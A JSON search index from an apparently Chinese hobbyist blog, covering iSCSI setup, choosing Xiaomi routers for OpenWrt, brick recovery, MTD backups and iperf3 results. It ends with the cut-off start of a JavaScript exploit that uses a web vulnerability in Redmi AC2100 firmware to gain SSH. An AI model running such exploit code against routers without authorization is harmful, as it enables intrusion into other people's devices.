<p>\u76f8\u4e92CHAP\u9a8c\u8bc1\uff1a\u5f00\u542f\u540e\u4e0d\u77e5\u9053\u600e\u4e48\u5728windows initiator\u4e2d\u5bf9\u5e94\u8bbe\u7f6e\uff0c\u56e0\u6b64\u6ca1\u8bd5</p> </li> <li> <p>\u91cd\u542ftgt\u670d\u52a1</p> </li> </ul> <pre><code>sudo systemctl restart tgt\n</code></pre> <ol> <li>\u67e5\u770btgt\u72b6\u6001</li> </ol> <pre><code>sudo tgtadm --mode target --op show\n</code></pre> <p>\u5e94\u8be5\u53ef\u4ee5\u770b\u5230\u5173\u4e8eLUN0\u548cLUN1\u7684\u914d\u7f6e\uff0c\u5982\u679c\u6ca1\u6709LUN1\u5219\u518d\u6b21\u91cd\u542f\u4e0b</p>","tags":["iscsi","\u7f51\u7edc\u6302\u8f7d"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/12/2022-02-12-%E7%BD%91%E7%BB%9C%E6%8C%82%E8%BD%BD%E7%A3%81%E7%9B%98%28iSCSi%29/#\u5ba2\u6237\u7aefinitiator","title":"\u5ba2\u6237\u7aef(initiator)","text":"","tags":["iscsi","\u7f51\u7edc\u6302\u8f7d"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/12/2022-02-12-%E7%BD%91%E7%BB%9C%E6%8C%82%E8%BD%BD%E7%A3%81%E7%9B%98%28iSCSi%29/#windows10","title":"Windows10","text":"<ol> <li>\u4f7f\u7528windows\u7684\u641c\u7d22\u529f\u80fd\uff0c\u641c\u7d22open iSCSI\u3002\u7b2c\u4e00\u6b21\u6253\u5f00\u53ef\u80fd\u4f1a\u63d0\u793a\u5f00\u542f\u76f8\u5173\u670d\u52a1\uff0c\u786e\u8ba4\u5373\u53ef</li> </ol> <ol> <li>\u9996\u5148\u5728\u914d\u7f6e\u680f\u4fee\u6539\u6389\u9ed8\u8ba4\u7684\u540d\u79f0\uff0c\u6ce8\u610f\u533a\u5206\u5927\u5c0f\u5199</li> </ol> <ol> <li>\u7136\u540e\u5728\u76ee\u6807\u680f\u4e2d\u586b\u5165ip\u5730\u5740\u6216\u57df\u540d\uff08\u652f\u6301ipv6\uff09\uff0c\u70b9\u51fb\u5feb\u901f\u8fde\u63a5\u3002</li> </ol> <ol> <li>\u5982\u679c\u8fde\u63a5\u6210\u529f\u540e\uff0c\u76ee\u6807\u4f1a\u663e\u793a\u5728\u5df2\u53d1\u73b0\u7684\u76ee\u6807\u4e2d\uff0c\u53ef\u4ee5\u65ad\u5f00\u8fde\u63a5\uff0c\u6216\u4e0b\u6b21\u518d\u6b21\u8fde\u63a5</li> </ol> <p>\u8fde\u63a5\u6210\u529f\u540e\uff0c\u8fdb\u5165\u78c1\u76d8\u7ba1\u7406\uff0c\u4fbf\u4f1a\u51fa\u73b0\u4e00\u4e2a\u6ca1\u6709\u4f7f\u7528\u7684\u78c1\u76d8\uff0c\u683c\u5f0f\u5316\u5373\u53ef\u3002 </p> <p></p>","tags":["iscsi","\u7f51\u7edc\u6302\u8f7d"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/12/2022-02-12-%E7%BD%91%E7%BB%9C%E6%8C%82%E8%BD%BD%E7%A3%81%E7%9B%98%28iSCSi%29/#\u8fde\u63a5\u5931\u8d25","title":"\u8fde\u63a5\u5931\u8d25","text":"<p>How can I troubleshoot iSCSI connection issues? (DSM 6.x) - Synology Knowledge Center</p> <p>If the iSCSI Initiator cannot find an iSCSI target:</p> <ol> <li>In Windows iSCSI Initiator, go to</li> <li>Specify the network interface to use for iSCSI connections if you have more than one network interfaces on both the initiator and target.</li> <li>Make sure that Enable CHAP log on is not checked.      </li> </ol> <p>If the iSCSI Initiator finds an iSCSI target but fails to connect to it:</p> <ul> <li>Specify the network interface to use for iSCSI connections if you have more than one network interfaces on both the initiator and target.</li> <li>Make sure that you entered identical name and password on DSM as the Name and Target secret in Windows iSCSI Initiator.   </li> </ul>","tags":["iscsi","\u7f51\u7edc\u6302\u8f7d"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/","title":"openwrt\u5237\u673a","text":"<p>\u4ecb\u7ecd\u4e86\u4ece\u786c\u4ef6\u9009\u62e9\u5230\u5237\u673a\u6574\u4e2a\u8fc7\u7a0b</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#openwrt\u786c\u4ef6\u9009\u62e9","title":"Openwrt\u786c\u4ef6\u9009\u62e9","text":"<p>\u5982\u4f55\u9009\u62e9\u4e00\u4e2a\u53ef\u4ee5\u5237openwrt\u7684\u8def\u7531\u5668\uff1f</p> <ul> <li>\u8001\u623f\u5b50WiFi\u5e03\u7f51\u653b\u7565 \u7bc7\u4e09\u5341\u516b\uff1aWiFi 6 \u6885\u6797\u6216openwrt\u56fa\u4ef6\u8def\u7531\u5668\u5165\u624b\u6307\u5357_\u8def\u7531\u5668_\u4ec0\u4e48\u503c\u5f97\u4e70 (smzdm.com)</li> <li>\u8001\u623f\u5b50WiFi\u5e03\u7f51\u653b\u7565 \u7bc7\u4e8c\u5341\u56db\uff1a\u4e0d\u6f0f\u6cb9\u7684\u8def\u7531\u5668\u4e0d\u662f\u597d\u77ff\u673a\uff0c\u77ff\u6e23\u8def\u7531\u5668\u76d8\u70b9_\u8def\u7531\u5668_\u4ec0\u4e48\u503c\u5f97\u4e70 (smzdm.com)</li> <li>\u6781\u8def\u7531\u3001\u65b0\u8def\u7531\uff1a\u673a\u7687\uff01\u51e0\u79cd\u9ad8\u6027\u4ef7\u6bd4\u77ff\u6e23\u8def\u7531\u5668\u6bd4\u8f83-\u65b0\u624b\u5165\u95e8\u53ca\u5176\u5b83(\u786c\u4ef6)-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b (right.com.cn)</li> </ul>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5c0f\u7c73\u8def\u7531\u5668\u578b\u53f7\u603b\u7ed3","title":"\u5c0f\u7c73\u8def\u7531\u5668\u578b\u53f7\u603b\u7ed3","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#cpu\u5206\u7c7b","title":"CPU\u5206\u7c7b","text":"<ul> <li>mt7621\u578b\u53f7</li> <li>R3G\uff1a\u54b8\u9c7c50\u5143\u5de6\u53f3\uff0c\u6709USB3.0\u63a5\u53e3\uff0c128MB\u7684flash\u3002</li> <li>4A\u5343\u5146\u7248\uff1a\u54b8\u9c7c70\u5143\u5de6\u53f3\uff0c\u5916\u89c2\u7b80\u7ea6\u6f02\u4eae\uff0c16MB NOR flash\u6709\u70b9\u5c0f\u3002</li> <li>C660x\uff1a\u54b8\u9c7c100\u591a\uff0c\u652f\u6301wifi6</li> <li>\u9ad8\u901a\u578b\u53f7</li> <li>\u76ee\u524d(22.03)\u53ea\u6709AX6S\u662f\u53d7openwrt\u5b98\u65b9\u652f\u6301\u7684\uff0cAX6, AX3600\u6709\u7b2c\u4e09\u65b9\u652f\u6301\u3002AX5\u7b49\u5176\u4f59\u672a\u652f\u6301<ul> <li>\u4e0d\u80fd\u5237\u597d\u50cf\u662flinux kernel\u8fd8\u4e0d\u652f\u6301\u9ad8\u901a\u7684IPQ SoC\u3002</li> <li>B\u7ad9\u770b\u5230\u8bf4AX5\u5237openwrt\u9700\u8981\u786c\u6539\u5185\u5b58\u4e3a1G\uff0c\u597d\u50cf\u8bf4\u9ad8\u901a\u7684wifi\u9a71\u52a8\u975e\u5e38\u8017\u5185\u5b58</li> </ul> </li> <li>AX6S\uff1a220\u5de6\u53f3</li> <li>AX6\uff1a250-300\u5de6\u53f3</li> </ul>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5c0f\u7c73\u7cfb\u5217\u4ea7\u54c1","title":"\u5c0f\u7c73\u7cfb\u5217\u4ea7\u54c1","text":"<ul> <li>\u7ea2\u7c73AX5\uff0c\u5c0f\u7c73AX1800\u6362\u76ae</li> <li> <p>IPQ6000, 4\u6838A53@1.2Ghz\uff1a[OpenWrt Wiki] Xiaomi AX1800 (AX5/RA67)</p> </li> <li> <p>\u7ea2\u7c73AX6\uff0c\u5c0f\u7c73AX3600\u6362\u76ae</p> </li> <li>AX6, IPQ8071A@1.4GHz, 512(ram) + 128\uff1a[OpenWrt Wiki] Xiaomi Redmi AX6 Wi-Fi 6 Mesh Router</li> <li>AX3600, IPQ8071A, 512 + 256\uff1a[OpenWrt Wiki] Xiaomi AX3600</li> <li>\u5bf9\u6bd4\uff1a\u7ea2\u7c73AX6\u62c6\u673a\uff0c\u65e7\u6b3eWIFI6\u65e0\u7ebf\u8def\u7531\u5668-\u8def\u7531\u5668\u4ea4\u6d41 (acwifi.net)</li> <li>AX3000</li> <li>\u7ea2\u7c73AX3000\uff08\u6bd4\u8f83\u5e38\u89c1\uff09\uff0cIPQ5000\uff1a\u53cc\u6838A53@1.0GHz, 256(ram) + 128\uff1aRedmi\u8def\u7531\u5668AX3000\u7acb\u5373\u8d2d\u4e70-\u5c0f\u7c73\u5546\u57ce</li> <li>\u5c0f\u7c73AX3000\uff1aIPQ5000\uff1a\u53cc\u6838A53@1.0GHz, 256(ram) + 128\uff1a\u5c0f\u7c73\u8def\u7531\u5668AX3000\u7acb\u5373\u8d2d\u4e70-\u5c0f\u7c73\u5546\u57ce (mi.com)</li> <li>\u7ea2\u7c73AX3000\u6a21\u5177\u548cAX6S\u4e00\u6837\uff0c\u4e3a\u767d\u8272\u3002\u5c0f\u7c73AX3000\u4e3a\u9ed1\u8272\u56db\u68f1\u67f1\u3002</li> <li>AX5400</li> <li>\u7ea2\u7c73AX5400\uff0cIPQ5018\uff1a\u53cc\u6838A53@1.0GHz\uff0c512(ram) + 128\uff1a\u7ea2\u7c73AX5400\u5343\u5146\u7248\u62c6\u673a\uff0c\u770b\u770b\u4e0e\u7535\u7ade\u7248\u6709\u4ec0\u4e48\u5dee\u522b-\u8def\u7531\u5668\u4ea4\u6d41 (acwifi.net)</li> <li>AX6000</li> <li>\u5c0f\u7c73AX6000<ul> <li>IPQ5018, 2\u6838A53@1.0Ghz, 512(ram) + 128</li> <li>\u4f7f\u7528\u7684SoC IPQ5018\u4e3a\u9ad8\u901a\u6c89\u6d78\u5f0f\u5bb6\u5ead\u8054\u7f51\u5e73\u53f0\uff0c\u4e0d\u5982\u9ad8\u901a\u4e13\u4e1a\u8054\u7f51\u5e73\u53f0\u7684IPQ8071A\uff08AX3600\u4e0a\u7684\uff09</li> </ul> </li> <li>\u7ea2\u7c73AX6000\uff08\u5f88\u5f3a\uff09<ul> <li>MT7986A, 4\u6838A53@2.0Ghz, 512(ram) + 128\uff1a[OpenWrt Wiki] Xiaomi Redmi AX6000</li> <li>\u7ea2\u7c73AX6000\u62c6\u673a\uff0c\u6700\u4fbf\u5b9c\u7684\u56db\u68382.0GHz-\u8def\u7531\u5668\u4ea4\u6d41 (acwifi.net)</li> </ul> </li> </ul> <p></p> <p>\u53c2\u8003 - (33 \u5c01\u79c1\u4fe1 / 71 \u6761\u6d88\u606f) \u8def\u7531\u5668\u7ea2\u7c73ax3000\u548c\u7ea2\u7c73ax6\u9009\u62e9\u54ea\u4e2a? - \u77e5\u4e4e (zhihu.com) - \u5c0f\u7c73openwrt\u9875\u9762\uff1a[OpenWrt Wiki] Xiaomi - \u5e38\u89c1MediaTek SoC\uff1aMediaTek - WikiDevi.Wi-Cat.RU</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#2023-wifi6\u4ea7\u54c1","title":"2023 wifi6\u4ea7\u54c1","text":"<p>\u73b0\u5728\u9700\u6c42wifi6\uff0c\u4e14\u4fe1\u53f7\u8986\u76d6\u5e7f - \u5c0f\u7c73wr30u\uff1a\u8fd0\u8425\u5546\u5b9a\u5236\u7248 - 360 T7\uff1a\u548c\u4e0a\u8005\u786c\u4ef6\u4e00\u6478\u4e00\u6837\u300212v 1A</p> <p>wr30u: wifi6: \u5c0f\u7c73WR30U\u65e0\u7ebf\u8def\u7531\u5668\u62c6\u673a AX3000\u8054\u901a\u5b9a\u5236\u7248-\u8def\u7531\u5668\u4ea4\u6d41 (acwifi.net) 2023\u5e74\u652f\u6301\u5237\u673a\u7684\u8def\u7531\u5668\u5927\u5168\uff08\u5efa\u8bae\u6536\u85cf\uff09 - \u77e5\u4e4e (zhihu.com)</p> <ul> <li>AX1800\uff1acr660x</li> <li>AX3000\uff1acr880x\uff1a135</li> </ul> <p>618 \u60f3\u4e70\u53f0\u8def\u7531\u5668\u6c42\u63a8\u8350 - V2EX 150\u7684T7 512\u6539\uff1aWR30U\u8def\u7531\u5230\u4e86\u968f\u624b\u6d4b\u6d4b - \uff30\uff23\u6570\u7801 - Stage1st - stage1/s1 \u6e38\u620f\u52a8\u6f2b\u8bba\u575b (saraba1st.com)</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#cpu\u5bf9\u6bd4","title":"CPU\u5bf9\u6bd4","text":"<p>\u53c2\u8003\uff1a</p> <ul> <li> <p>[\u8f6c\u8d34] \u65e0\u7ebf\u8def\u7531\u5668CPU\u6d45\u6790 MT7621A\u3001 BCM47189 \u5230\u5e95\u8c01\u5f3a\uff1f-\u65b0\u624b\u5165\u95e8\u53ca\u5176\u5b83(\u786c\u4ef6)-\u6069\u5c71\u65e0\u7ebf\u8bba\u575b (right.com.cn)</p> </li> <li> <p>\u6811\u8393\u6d3e\u7cfb\u5217\u5904\u7406\u5668\uff1aRaspberry Pi Documentation - Processors</p> </li> <li>Raspberry Pi 2 Model B\uff1a BCM2836(quad-core Cortex-A7 )</li> <li>Raspberry Pi 3 Model B\uff1aBCM2837( quad-core Cortex-A53@1.2)<ul> <li>50% faster than the Raspberry Pi 2.</li> </ul> </li> <li>Raspberry Pi 3 Models A+, B+: BCM2837B0(quad-core Cortex-A53@1.4)<ul> <li>17% faster than the original Raspberry Pi 3</li> </ul> </li> <li> <p>Raspberry Pi 4 Model B: BCM2837(quad-core Cortex-A72@1.5 GHz)</p> <ul> <li>50% faster than the Raspberry Pi 3B+</li> </ul> </li> <li> <p>ARM\u6838\u5bf9\u6bd4\uff1aList of ARM processors - Wikipedia</p> </li> <li>Cortex-A7: 1.9 DMIPS/MHz per core</li> <li>A53: 2.3 DMIPS/MHz</li> <li>A72: 6.3-7.3 DMIPS/MHz</li> <li>MIPS\u6838\uff1aMIPS Classic Processor Cores - Imagination Technologies</li> <li>1004K: 1.6 DMIPS/MHz</li> <li> <p>74k: 1.93 DMIPS/MHz\uff1aCSAC\u8def\u7531\u5668\uff1a71</p> </li> <li> <p>newifi3-d2-firmware/README.md at master \u00b7 sawaYch/newifi3-d2-firmware (github.com)</p> </li> </ul>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5237\u673a\u8fc7\u7a0b\u603b\u7ed3","title":"\u5237\u673a\u8fc7\u7a0b\u603b\u7ed3","text":"<p>\u4ee5\u7ea2\u7c73AC2100\u53ef\u80fd\u7684\u5237\u673a\u4e3a\u4f8b\uff0c\u6db5\u76d6\u4e86openwrt\u7684\u5404\u79cd\u60c5\u51b5\uff1a\u5237breed\uff0c\u6062\u590d\uff0c\u4e34\u65f6\u955c\u50cf</p> <ul> <li> <p>\u5efa\u8bae\u76f4\u63a5\u4f7f\u7528\u5b98\u65b9openwrt\u955c\u50cf + \u5b98\u65b9\u5b89\u88c5\u65b9\u5f0f\u3002\u51e0\u6b21\u4f7f\u7528breed\u90fd\u9047\u5230\u4e86\u95ee\u9898\uff0c\u800c\u5c0f\u7c73\u5b98\u65b9\u6062\u590d\u5de5\u5177\u4e5f\u633a\u597d\u7528\u7684\u3002</p> </li> <li> <p>\u7b2c\u4e00\u6b21\u81ea\u5df1\u5237\u673a\u7ea2\u7c73AC2100[[\u8bb0\u5f55\u7ea2\u7c73AC2100\u6298\u817e]]\uff0c\u4e00\u5f20\u7cbe\u534e\u56fe</p> </li> </ul> <p></p> <ul> <li>\u8def\u7531\u5668\u5237\u51fa\u95ee\u9898\uff0c\u4fee\u590d\u7ecf\u9a8c\u3002\u77e5\u9053\u4e86\u5907\u4efd\u7684\u91cd\u8981\u6027[[\u8bb0\u5f55\u8bb0\u4e00\u6b21\u8def\u7531\u5668\u5237\u51fa\u95ee\u9898\u4fee\u590d\u8fc7\u7a0b]]</li> </ul>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5c0f\u7c73\u8def\u7531\u5668\u6551\u7816","title":"\u5c0f\u7c73\u8def\u7531\u5668\u6551\u7816","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u6709\u5b98\u65b9bootloader\u7684\u60c5\u51b5","title":"\u6709\u5b98\u65b9bootloader\u7684\u60c5\u51b5","text":"<p>\u8bf4\u660e\uff1a</p> <p>\u5b98\u65b9\u7684\u5f15\u5bfc\u7a0b\u5e8f\u4f7f\u7528\u7684\u662fuboot\uff0c\u4f4d\u4e8eflash\u7684Bootloader\u5206\u533a\uff0c\u800c\u5b98\u65b9\u56fa\u4ef6\u5219\u4f4d\u4e8eOS1\u5206\u533a\uff08\u7ea2\u7c73AC2100\uff09\u3002\u6b63\u5e38\u5237openwrt\u7684\u8fc7\u7a0b\u4e2d\u4e0d\u4f1a\u4fee\u6539bootloader\u3002\u53ea\u8981\u8fd8\u4fdd\u7559\u7740\u5b98\u65b9bootloader\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7\u5b98\u65b9\u4fee\u590d\u5de5\u5177\u6062\u590d\u3002</p> <p>\u6b65\u9aa4\uff1a</p> <ol> <li>\u4e0b\u8f7d<code>\u5c0f\u7c73\u8def\u7531\u5668\u4fee\u590d\u5de5\u5177</code>\u548c\u5b98\u65b9\u955c\u50cf\uff1a\u3010\u4e0b\u8f7d\u6c47\u603b\u3011\u5ba2\u6237\u7aef/ROM\u4e0b\u8f7d - \u5c0f\u7c73\u793e\u533a (xiaomi.cn)</li> <li>\u8def\u7531\u5668\u901a\u7535\uff0cPC\u901a\u8fc7\u7f51\u7ebf\u8fde\u63a5\u5230\u8def\u7531\u5668LAN\u53e3</li> <li>\u6253\u5f00<code>MIWIFIRepairTool.x86.exe</code></li> <li>\u9009\u62e9\u955c\u50cf</li> <li>\u9009\u62e9\u7f51\u5361\uff08\u53ef\u4ee5\u5728\u7f51\u7edc\u4e2d\u5fc3\u4e2d\u5c06\u5176\u5b83\u7f51\u5361\u7981\u7528\uff09</li> <li>\u65ad\u5f00\u8def\u7531\u5668\u7535\u6e90\uff0c\u6309\u4f4frst\u952e\uff08\u4e5f\u6709\u53ef\u80fd\u9700\u8981\u7528\u9488\u6233\uff09\uff0c\u7136\u540e\u63a5\u4e0a\u7535\u6e90\uff0c\u7b49\u5f85\u9ec4\u706f\u95ea\u70c1\uff08\u4e24\u4e2a\u706f\uff0c\u4e00\u4e2a\u662f\u6709\u7535\u6e90\u6807\u5fd7\uff0c\u4e00\u4e2a\u6709\u4e92\u8054\u7f51\u6807\u5fd7\uff0c\u8fd9\u91cc\u4e3a\u7535\u6e90\u706f\u90a3\u4e2a\uff09</li> <li>\u8f6f\u4ef6\u81ea\u52a8\u4e0a\u4f20\u955c\u50cf</li> <li>\u4fdd\u6301\u8010\u5fc3\u7b49\u5f85\u8def\u7531\u5668\u9ec4\u706f\u53d8\u84dd\uff08\u4e2d\u95f4\u8fc7\u7a0b\u4fdd\u6301\u9ec4\u706f\uff09\uff0c\u4eb2\u6d4b\u9700\u89814\u5206\u949f</li> <li>\u65ad\u7535\u540e\u91cd\u65b0\u63a5\u4e0a\u7535\u6e90\uff0c\u8def\u7531\u5668\u91cd\u542f</li> </ol>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5237\u4e86breed","title":"\u5237\u4e86breed","text":"<p>\u8bf4\u660e\uff1a</p> <p>breed\u81ea\u8eab\u4fbf\u662f\u4e00\u4e2abootloader\uff0c\u5237\u5b8cbreed\u540e\u4f1a\u8986\u76d6\u539f\u672c\u7684bootloader\u3002\u5982\u679c\u60f3\u590d\u539f\uff0c\u53ef\u901a\u8fc7breed\u7684\u529f\u80fd\uff0c\u91cd\u65b0\u5237\u56de\u5b98\u65b9bootloader\u3002\u5f3a\u70c8\u5efa\u8bae\u5237breed\u524d\uff0c\u5148\u5907\u4efd\u539f\u672c\u7684bootloader\u4ee5\u53ca\u6574\u4e2aflash\u3002\u5982\u679c\u6ca1\u5907\u4efd\uff0c\u8fd9\u91cc\u662f\u6069\u5c71\u4e0a\u6536\u96c6\u7684\u5c0f\u7c73\u5b98\u65b9bootloader\u4e0b\u8f7d\uff1a\u8bba\u575b\u6536\u96c6\u7684\u51e0\u4e2a\u5c0f\u7c73\u8def\u7531\u5668\u5b98\u65b9bootloader - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b</p> <p>\u6b65\u9aa4\uff1a</p> <ol> <li>\u901a\u8fc7breed\u5237\u56de\u5b98\u65b9bootloader</li> <li>\u901a\u8fc7\u5b98\u65b9\u4fee\u590d\u5de5\u5177\u4fee\u590d</li> </ol>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5e38\u7528\u64cd\u4f5c","title":"\u5e38\u7528\u64cd\u4f5c","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5237\u4e4b\u524d\u5907\u4efdmtd\u5206\u533a","title":"\u5237\u4e4b\u524d\u5907\u4efdmtd\u5206\u533a","text":"<p>\u8def\u7531\u5668flash\u6709\u82e5\u5e72\u5206\u533a\uff0c\u5176\u4e2d\u6709\u4e00\u4e2a\u5206\u533a\u5b58\u50a8\u8def\u7531\u5668MAC\u5730\u5740\u3001\u65e0\u7ebf\u6821\u51c6\u53c2\u6570\u7b49\u3002\u82e5\u635f\u574f\u53ef\u80fd\u5bfc\u81f4\u65e0\u7ebf\u4fe1\u53f7\u5f31\u7b49\u95ee\u9898\u3002\u56e0\u6b64\u5237\u4e4b\u524d\u6700\u597d\u5907\u4efd\u3002 \u67e5\u770bmtd\u5206\u533a</p> <pre><code>root@XiaoQiang:~# cat /proc/mtd\ndev:    size   erasesize  name\nmtd0: 07f80000 00020000 \"ALL\"\nmtd1: 00080000 00020000 \"Bootloader\"\nmtd2: 00040000 00020000 \"Config\"\nmtd3: 00040000 00020000 \"Bdata\"\nmtd4: 00040000 00020000 \"Factory\"\nmtd5: 00040000 00020000 \"crash\"\nmtd6: 00040000 00020000 \"crash_syslog\"\nmtd7: 00040000 00020000 \"reserved0\"\nmtd8: 00400000 00020000 \"kernel0\"\nmtd9: 00400000 00020000 \"kernel1\"\nmtd10: 02000000 00020000 \"rootfs0\"\nmtd11: 02000000 00020000 \"rootfs1\"\nmtd12: 03580000 00020000 \"overlay\"\nmtd13: 012a6000 0001f000 \"ubi_rootfs\"\nmtd14: 030ec000 0001f000 \"data\"\n</code></pre> <p>\u5907\u4efdfactory\u5206\u533a\uff08\u5c0f\u7c73\u8def\u7531\u5668\u4e00\u822c\u662ffactory\u5b58\u50a8\u4e86\u4e0a\u8ff0\u90a3\u4e9b\u6570\u636e\uff09 <pre><code>cat /dev/mtd4 &gt; /tmp/factory.bin\n</code></pre></p> <p>\u4e4b\u540e\u901a\u8fc7scp\u590d\u5236\u5230\u672c\u5730</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#snapshot\u7684\u8bf4\u660e","title":"snapshot\u7684\u8bf4\u660e","text":"<p>snapshot\u662f\u5f00\u53d1\u7248\u5206\u652f</p> <ul> <li>\u9ed8\u8ba4\u6ca1\u6709\u5b89\u88c5luci\uff08\u6ca1\u6709\u7f51\u9875\u754c\u9762\uff09</li> <li>\u4e0a\u6e38\u6bcf\u5929\u90fd\u4f1a\u7f16\u8bd1\u4ea7\u751f\u65b0\u7684snapshot\u3002\u5bf9\u4e8ekernel mod\u76f8\u5173\u8f6f\u4ef6\uff0c\u4e0d\u662f\u540c\u4e00\u6b21\u7f16\u8bd1\u5219\u65e0\u6cd5\u5b89\u88c5\u3002</li> <li>[OpenWrt Wiki] Installing OpenWrt development snapshots</li> </ul>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u547d\u4ee4\u884c\u5b89\u88c5sysupgradebin","title":"\u547d\u4ee4\u884c\u5b89\u88c5sysupgrade.bin","text":"<ul> <li>[OpenWrt Wiki] Upgrading OpenWrt firmware using CLI</li> </ul> <pre><code>sysupgrade -v /tmp/firmware_image.bin\n\n#If sysupgrade is not available.\n# Flash firmware\nmtd -r write /tmp/firmware_image.bin firmware\n</code></pre>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5907\u4efd\u6062\u590d-cli","title":"\u5907\u4efd\u6062\u590d CLI","text":"<ul> <li>\u5b98\u65b9\uff1a[OpenWrt Wiki] Backup and restore</li> </ul> <p>\u81ea\u5df1\u5b9e\u73b0\u4e86\u4e00\u4e2a\u81ea\u52a8\u914d\u7f6eopenwrt\u811a\u672c</p> <ul> <li>TheRainstorm/my-openwrt-config (github.com)</li> </ul>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u6027\u80fd\u6d4b\u8bd5","title":"\u6027\u80fd\u6d4b\u8bd5","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#iperf3","title":"iperf3","text":"<p>ax6s &amp; mi4a</p> \u6d4b\u8bd5\u76ee\u7684 \u8fde\u63a5 src dst speed(Mb/s) \u5907\u6ce8 ax6s LAN\u6027\u80fd \u5343\u5146USB\u7f51\u5361 tianyi310 ax6s 941 ax6s \u65e0\u7ebf\u6027\u80fd wifi6 5Ghz@1201 s3pro ax6s 626 mi4a LAN\u6027\u80fd 2.5G\u7f51\u5361 ryzen mi4a 470 \u96a7\u9053\u6027\u80fd tianyi310 ryzen 118 \u96a7\u9053\u6027\u80fd mi4a ax6s 136 ax6s mi4a 149 mi4a\u4ea4\u6362\u6027\u80fd ryzen - mi4a - p2w ryzen p2w 943 \u7ed3\u679c\u5c45\u7136\u6bd4ryzen - mi4a\u8fd8\u8981\u5feb\uff01 <p>\u5c06r4a\u66ff\u6362\u6389\u540e | \u6d4b\u8bd5\u76ee\u7684 | src       | dst       | speed(Mb/s) | \u5907\u6ce8 | | -------- | --------- | --------- | ----------- | ---- | | p2w      | ryzen     | p2w       | 936     |      | |          | p2w       | ryzen     | 577   |      | | \u96a7\u9053\u6027\u80fd | p2w       | ax6s      | 150         |      | |          | ax6s      | p2w       | 250         |      | | \u96a7\u9053\u6027\u80fd | ryzen     | tianyi310 | 295     |      | |          | tianyi310 | ryzen     | 173     |      | |          | s3pro     | ryzen     | 256         |      | | 780/886  | s3pro     | p2w       | 370     |      | |          | ryzen     | s3pro     | 274         |      |</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#\u5177\u4f53\u578b\u53f7\u5237\u673a\u8fc7\u7a0b","title":"\u5177\u4f53\u578b\u53f7\u5237\u673a\u8fc7\u7a0b","text":"","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#redmi-ac2100\u5237openwrt","title":"Redmi AC2100\u5237Openwrt","text":"<p>[OpenWrt Wiki] Xiaomi Redmi Router AC2100</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#1-\u786e\u8ba4stock\u7cfb\u7edf\u7248\u672c","title":"1. \u786e\u8ba4stock\u7cfb\u7edf\u7248\u672c","text":"<p>\u786e\u8ba4\u7cfb\u7edf\u7248\u672c\u662f\u5426\u4e3a2.0.23\uff0c\u5982\u679c\u4e0d\u662f\uff0c\u5219\u5728\u7cfb\u7edf\u5185\u624b\u52a8\u5347\u7ea7\u5230\u8be5\u7248\u672chttp://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/rm2100/miwifi_rm2100_all_fb720_2.0.23.bin</p>","tags":["openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/02/13/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/#2-\u83b7\u5f97ssh","title":"2. \u83b7\u5f97ssh","text":"<p>\u4f7f\u7528web\u6f0f\u6d1e\uff0c\u83b7\u5f97ssh</p> <pre><code>// Work for RedMi 2100 firmware 2.0.23\n// http://cdn.cnbj1.fds.api.mi-img.com/xiaoqiang/rom/rm2100/miwifi_rm2100_all_fb720_2.0.23.bin\n\nfunction getSTOK() {\n    let 